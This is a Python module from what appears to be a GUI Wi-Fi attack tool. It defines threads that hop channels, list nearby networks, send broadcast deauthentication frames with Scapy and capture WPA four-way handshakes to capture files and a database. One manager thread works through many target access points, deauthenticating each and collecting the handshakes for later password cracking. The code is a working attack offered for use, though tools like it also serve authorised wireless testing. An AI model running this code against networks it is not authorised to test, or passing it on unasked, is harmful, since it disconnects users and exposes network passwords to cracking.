#threads.py
#!/usr/bin/env python3
# threads.py
# ───────────────────────────────────────────────────────
# Thread classes for Wi-Fi work:
#   • ChannelHopper           – rotate channels
#   • LiveViewThread          – live beacon / probe feed
#   • HScaptureThread         – 4-way handshake capture (verifies 4 EAPOL frames + grabs real SSID)
#   • DeauthThread            – single-AP deauth via Scapy
#   • DeauthAllManagerThread  – multi-AP deauth + capture loop (with SSID fix)
# ───────────────────────────────────────────────────────

import threading
import time
import sqlite3
import datetime
import os
from collections import defaultdict, Counter

from PyQt5.QtCore import QThread, pyqtSignal
from scapy.all import sniff, sendp, conf, RadioTap, Dot11, Dot11Deauth
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp, Dot11Elt
from scapy.layers.eap import EAPOL

from config    import DB_PATH, ALL_CHANNELS
from db_utils  import ensure_db, save_cap
from sys_helpers import set_channel


def _get_ssid_from_beacons(iface: str, bssid: str, ch: int, timeout: int = 5) -> str:
    """
    Sniff for up to `timeout` seconds on channel `ch` for beacons/probe-responses
    from this BSSID. Returns the most-common SSID seen (or empty if none).
    """
    try:
        set_channel(iface, ch)
    except Exception:
        pass

    seen = []
    def _handle(pkt):
        if not pkt.haslayer(Dot11Elt):
            return
        src = pkt.addr2 or ""
        if src.lower() != bssid.lower():
            return
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            elt = pkt.getlayer(Dot11Elt)
            if elt.ID == 0 and elt.info:
                try:
                    ss = elt.info.decode(errors='ignore')
                except Exception:
                    ss = str(elt.info)
                if ss:
                    seen.append(ss)

    sniff(iface=iface, store=False, prn=_handle, timeout=timeout)
    if not seen:
        return ""
    return Counter(seen).most_common(1)[0][0]


class ChannelHopper(threading.Thread):
    """
    Rotate through given channels every <dwell> seconds,
    calling callback(ch) after each hop.
    """
    def __init__(self, iface, channels, dwell, callback=None):
        super().__init__(daemon=True)
        self.iface, self.channels, self.dwell, self.callback = iface, channels, dwell, callback
        self.running = False

    def run(self):
        self.running = True
        idx = 0
        while self.running and self.channels:
            ch = self.channels[idx % len(self.channels)]
            try:
                set_channel(self.iface, ch)
            except Exception:
                pass
            if self.callback:
                try:
                    self.callback(ch)
                except Exception:
                    pass
            time.sleep(self.dwell)
            idx += 1

    def stop(self):
        self.running = False


class LiveViewThread(QThread):
    updated = pyqtSignal(dict)  # emits dict of visible networks

    def __init__(self, iface, dwell, ssid_map):
        super().__init__()
        self.iface, self.dwell, self.ssid_map = iface, dwell, ssid_map
        self.networks, self.current, self.running = {}, None, False
        self.hopper = ChannelHopper(iface, ALL_CHANNELS, dwell,
                                    lambda ch: setattr(self, 'current', ch))

    def run(self):
        ensure_db(DB_PATH)
        conf.iface = self.iface
        self.hopper.start()
        self.running = True
        while self.running:
            try:
                sniff(iface=self.iface, store=False, prn=self._handle,
                      timeout=self.dwell)
            except Exception:
                pass
        self.hopper.stop()

    def _handle(self, pkt):
        if not (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)):
            return

        elt = pkt.getlayer(Dot11Elt)
        ssid = "<hidden>"
        if elt and elt.ID == 0 and elt.info:
            ssid = elt.info.decode(errors='ignore') if isinstance(elt.info, bytes) else str(elt.info)

        bssid = pkt.addr3 or pkt.addr2 or "N/A"
        sig = getattr(pkt, 'dBm_AntSignal', 'N/A')
        try:
            stats = (pkt[Dot11Beacon].network_stats()
                     if pkt.haslayer(Dot11Beacon)
                     else pkt[Dot11ProbeResp].network_stats())
            ch = stats.get('channel', self.current)
        except Exception:
            ch = self.current

        key = (bssid, ssid)
        self.networks[key] = {'ssid': ssid, 'bssid': bssid,
                              'channel': ch, 'signal': sig}
        self.ssid_map[bssid] = ssid
        self.updated.emit(self.networks.copy())

    def stop(self):
        self.running = False
        self.wait()


class HScaptureThread(QThread):
    log = pyqtSignal(str, str, str)  # msg, type, bssid

    def __init__(self, iface, channels, dwell, ssid_map):
        super().__init__()
        self.iface, self.channels, self.dwell, self.ssid_map = iface, channels, dwell, ssid_map
        self.running = False
        self.cache = defaultdict(dict)

    def run(self):
        ensure_db(DB_PATH)
        conf.iface = self.iface
        self.running = True

        if len(self.channels) == 1:
            self._scan_channel(self.channels[0])
            return
        if not self.channels:
            self.log.emit('[Capture] [!] No channels to scan', 'error', None)
            return

        while self.running:
            for ch in self.channels:
                if not self.running:
                    break
                self._scan_channel(ch)

    def _scan_channel(self, ch):
        set_channel(self.iface, ch)
        self.log.emit(f'[Capture] [+] Switching to channel {ch}', 'scan', None)
        sniff(iface=self.iface, filter='ether proto 0x888e', store=False,
              prn=lambda pkt: self._pkt(pkt, ch), timeout=self.dwell)

    def _pkt(self, pkt, ch):
        if not pkt.haslayer(EAPOL):
            return
        ap_bssid = pkt.addr3 or pkt.addr2 or pkt.addr1 or 'unknown'
        client = pkt.addr2 if pkt.addr2 != ap_bssid else pkt.addr1
        key = (ap_bssid, client)
        raw = bytes(pkt)

        if raw not in self.cache[key]:
            self.cache[key][raw] = pkt
            self.log.emit(f'[DEBUG] New EAPOL frame from AP {ap_bssid} client {client} (cache size {len(self.cache[key])}/4)', 'debug', ap_bssid)
        else:
            self.log.emit(f'[DEBUG] Duplicate EAPOL frame from AP {ap_bssid} client {client}', 'debug', ap_bssid)

        count = len(self.cache[key])
        self.log.emit(f'[Capture] EAPOL frames: {count}/4', 'info', ap_bssid)
        if count < 4:
            return

        pkts = list(self.cache.pop(key).values())[:4]
        ssid = self.ssid_map.get(ap_bssid, 'Hidden')
        path = save_cap(ssid, ap_bssid, pkts)

        # fallback: grab real SSID if hidden
        if ssid == 'Hidden':
            real_ssid = _get_ssid_from_beacons(self.iface, ap_bssid, ch)
            if real_ssid:
                dirn = os.path.dirname(path)
                fname = os.path.basename(path)
                new_fname = fname.replace('Hidden_', f'{real_ssid}_', 1)
                new_path = os.path.join(dirn, new_fname)
                try:
                    os.rename(path, new_path)
                    path = new_path
                    ssid = real_ssid
                    self.log.emit(f'[Capture] Renamed HS to real SSID {real_ssid}', 'info', ap_bssid)
                except Exception as e:
                    self.log.emit(f'[Capture] Rename failed: {e}', 'error', ap_bssid)

        self.log.emit(f'[Capture] FULL HS → {path}', 'handshake', ap_bssid)

    def stop(self):
        self.running = False
        self.wait()


class DeauthThread(QThread):
    started_signal = pyqtSignal()
    error = pyqtSignal(str)
    done = pyqtSignal(int)

    def __init__(self, iface, bssid, channel, count=64, inter=0.1):
        super().__init__()
        self.iface, self.bssid, self.channel = iface, bssid, channel
        self.count, self.inter = count, inter

    def run(self):
        self.started_signal.emit()
        try:
            set_channel(self.iface, self.channel)
            time.sleep(0.2)
            conf.iface = self.iface
            pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=self.bssid,
                                     addr3=self.bssid) / Dot11Deauth(reason=7)
            sendp(pkt, iface=self.iface, count=self.count,
                  inter=self.inter, verbose=False)
        except Exception as e:
            self.error.emit(f'{type(e).__name__}: {e}')
        finally:
            self.done.emit(self.channel)


class DeauthAllManagerThread(QThread):
    log = pyqtSignal(str, str, str)
    progress = pyqtSignal(int, int)
    finished = pyqtSignal()

    def __init__(self, iface, targets, dwell, ssid_map,
                 deauth_count=64, inter=0.1, per_ap_timeout=5):
        super().__init__()
        self.iface, self.targets, self.dwell, self.ssid_map = iface, targets, dwell, ssid_map
        self.deauth_count, self.inter = deauth_count, inter
        self.per_ap_timeout = per_ap_timeout
        self.cache = defaultdict(dict)
        self.running = True

    def run(self):
        ensure_db(DB_PATH)
        conf.iface = self.iface
        total = len(self.targets)

        for idx, (bssid, ch) in enumerate(self.targets, 1):
            if not self.running:
                break
            self.progress.emit(idx, total)
            try:
                set_channel(self.iface, ch)
                self.log.emit(f'[DeauthAll] Ch {ch}  BSSID {bssid}', 'scan', bssid)
                pkt = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=bssid,
                                         addr3=bssid) / Dot11Deauth(reason=7)
                sendp(pkt, iface=self.iface, count=self.deauth_count,
                      inter=self.inter, verbose=False)
                self.log.emit(f'[Capture] Listening {self.dwell}s', 'scan', bssid)
                sniff(iface=self.iface, filter='ether proto 0x888e', store=False,
                      prn=lambda p: self._pkt(p, ch), timeout=self.dwell)
            except Exception as e:
                self.log.emit(f'[DeauthAll] ERROR: {e}', 'error', bssid)
            time.sleep(self.per_ap_timeout)
        self.finished.emit()

    def _pkt(self, pkt, ch):
        if not pkt.haslayer(EAPOL):
            return
        ap_bssid = pkt.addr3 or pkt.addr2 or pkt.addr1 or 'unknown'
        client = pkt.addr2 if pkt.addr2 != ap_bssid else pkt.addr1
        key = (ap_bssid, client)
        raw = bytes(pkt)
        if raw not in self.cache[key]:
            self.cache[key][raw] = pkt
        count = len(self.cache[key])
        self.log.emit(f'[Capture] EAPOL frames: {count}/4', 'info', ap_bssid)
        if count < 4:
            return
        pkts = list(self.cache.pop(key).values())[:4]
        ssid = self.ssid_map.get(ap_bssid, 'Hidden')
        path = save_cap(ssid, ap_bssid, pkts)
        if ssid == 'Hidden':
            real_ssid = _get_ssid_from_beacons(self.iface, ap_bssid, ch)
            if real_ssid:
                dirn = os.path.dirname(path)
                fname = os.path.basename(path)
                new_fname = fname.replace('Hidden_', f'{real_ssid}_', 1)
                new_path = os.path.join(dirn, new_fname)
                try:
                    os.rename(path, new_path)
                    path = new_path
                    ssid = real_ssid
                    self.log.emit(f'[Capture] Renamed HS to real SSID {real_ssid}', 'info', ap_bssid)
                except Exception as e:
                    self.log.emit(f'[Capture] Rename failed: {e}', 'error', ap_bssid)
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO handshakes(ssid,bssid,timestamp,raw_packet) "
            "VALUES(?,?,?,?)",
            (ssid, ap_bssid, datetime.datetime.now().isoformat(), bytes(pkts[0]))
        )
        conn.commit(), conn.close()
        self.log.emit(f'[Capture] FULL HS → {path}', 'handshake', ap_bssid)

    def stop(self):
        self.running = False
        self.wait()
